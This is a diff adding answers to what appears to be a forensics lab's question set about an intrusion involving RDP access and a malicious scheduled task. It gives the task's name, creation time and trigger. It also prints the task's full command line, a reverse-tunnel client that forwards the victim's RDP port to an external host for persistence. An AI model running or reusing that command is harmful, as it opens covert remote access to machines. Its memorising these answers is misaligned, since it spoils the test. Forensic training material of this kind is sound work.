@@ -67,5 +67,21 @@ What is the timestamp when the attacker disconnected from RDP?
 (format: 2025-01-05 15:30:45)
 Answer is: 2025-01-23 17:16:46
 
+=====
 
+Task 6-1
+What is the name of the suspicious scheduled task?
+Answer is: Apache Proxy
 
+Task 6-2
+When was the suspicious scheduled task created?
+(format: 2025-01-05 15:30:45)
+Answer is: 2025-01-23 17:05:37
+
+Task 6-3
+What is the task's "Trigger" value as shown in Task Scheduler GUI?
+Answer is: At system startup
+
+Task 6-4
+What is the full command line of the malicious task?
+Answer is: C:\Apache24\bin\httpd-proxy.exe client 10.10.23.190:10443 R:3389:127.0.0.1:3389
